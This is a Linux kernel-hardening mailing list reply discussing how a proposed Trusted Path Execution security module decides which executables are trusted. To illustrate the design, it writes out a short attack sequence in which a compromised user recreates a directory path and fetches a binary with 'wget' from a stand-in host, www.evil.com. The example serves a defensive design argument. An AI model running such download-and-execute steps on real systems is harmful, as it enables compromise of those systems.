References: <20170608034349.31876-1-matt@nmatt.com>
 <20170608193719.2d9e8d17@lxorguk.ukuu.org.uk>
From: Matt Brown <matt@nmatt.com>
Message-ID: <3f9e53a8-87d2-9773-d30b-64b89da8f3ff@nmatt.com>
Date: Thu, 8 Jun 2017 15:01:57 -0400
MIME-Version: 1.0
In-Reply-To: <20170608193719.2d9e8d17@lxorguk.ukuu.org.uk>
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Subject: [kernel-hardening] Re: [PATCH v2 0/1] Add Trusted Path Execution as a stackable LSM
To: Alan Cox <gnomes@lxorguk.ukuu.org.uk>
Cc: james.l.morris@oracle.com, serge@hallyn.com, linux-kernel@vger.kernel.org, linux-security-module@vger.kernel.org, kernel-hardening@lists.openwall.com
List-ID: <kernel-hardening.lists.openwall.com>

On 6/8/17 2:37 PM, Alan Cox wrote:
>> http://phrack.org/issues/52/6.html#article
>>
>> | A trusted path is one that is inside a root owned directory that
>> | is not group or world writable.  /bin, /usr/bin, /usr/local/bin, are
>> | (under normal circumstances) considered trusted.  Any non-root
>> | users home directory is not trusted, nor is /tmp.
> 
> Note that in the real world the trusted path would and should also
> require that any elements of the path above that point are also locked
> down if you are using path based models. Ie you need to ensure nobody has
> the ability to rename /usr or /usr/local before you trust /usr/local/bin.
> 

So actually in this LSM it's not so much full paths that are trusted,
rather it checks that the directory containing the program is only
writable by root and that the program itself is only writable by root.

For example, consider the following:

/user/ with permissions drwxr-xr-x user user
/user/user-owned/ with permissions drwxr-xr-x user user
/user/user-owned/root-owned/ with permissions drwxr-xr-x root root
/user/user-owned/root-owned/exe with permissions -rwxr-xr-x root root

currently /user/user-owned/root-owned/exe is trusted because it can only
be written to by root, and the directory it is in can only be written by
root.

but then user becomes compromised and does the following:
cd /user/
mv user-owned user-owned-back
mkdir -p user-owned/root-owned
cd user-owned/root-owned
wget www.evil.com/exe

Now /user/user-owned/root-owned/exe is untrusted and its execution will
be denied unless you put user in the trusted group.

Matt
